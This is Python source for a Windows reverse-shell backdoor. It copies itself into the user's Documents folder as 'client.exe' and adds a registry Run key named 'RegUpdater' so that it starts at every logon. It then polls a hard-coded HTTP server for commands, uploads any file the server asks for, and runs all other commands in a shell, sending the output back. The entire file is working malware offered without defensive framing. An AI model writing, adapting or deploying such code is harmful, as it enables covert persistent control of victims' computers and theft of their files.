
import requests
import subprocess
import os
import time
import shutil
import winreg

SERVER_IPADDR = "192.168.1.205"
PORT = "8000"
URL_STRING = "http://{}:{}".format(SERVER_IPADDR, PORT)

cwdPath = os.getcwd().strip("\n")
subprocessObject = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE,stderr=subprocess.PIPE)
unwantedValue, userPath = subprocessObject.decode().split("=")
fileDestination = userPath.strip("\n\r")+"\\Documents\\"+"client.exe"

if not os.path.exists(fileDestination):
    shutil.copyfile(cwdPath+"\Http_windows_client_reverseShell.exe",fileDestination)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Windows\CurrentVersion\Run",0,0)
    winreg.SetValueEx(key,"RegUpdater",0,winreg.REG_SZ,fileDestination)
    key.Close()

def web_client():
    while True:
        getResponse = requests.get(URL_STRING)
        evilCommand = getResponse.text

        if 'terminate' in evilCommand:
            return 1
            break
        
        elif 'get' in evilCommand:
            getString, filename = evilCommand.split("*")
            if os.path.exists(filename):
                url_toProcessFile = URL_STRING+"/data"
                data = b''
                with open(filename,'rb') as fileObject:
                    data = fileObject.read()

                fileObject = {"file": data}
                r = requests.post(url_toProcessFile,files=fileObject)
                
                
             
            else:
                postResponse = requests.post(URL_STRING,data="File Not Found")
        
        else:
            shellObject = subprocess.Popen(evilCommand, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            postResponse = requests.post(URL_STRING,data=shellObject.stdout.read())
            postResponse = requests.post(URL_STRING,data=shellObject.stderr.read())

if __name__ == "__main__":
    while True:
        try:
          status = web_client()
          if status == 1:
              break
        except Exception:
            time.sleep(10)
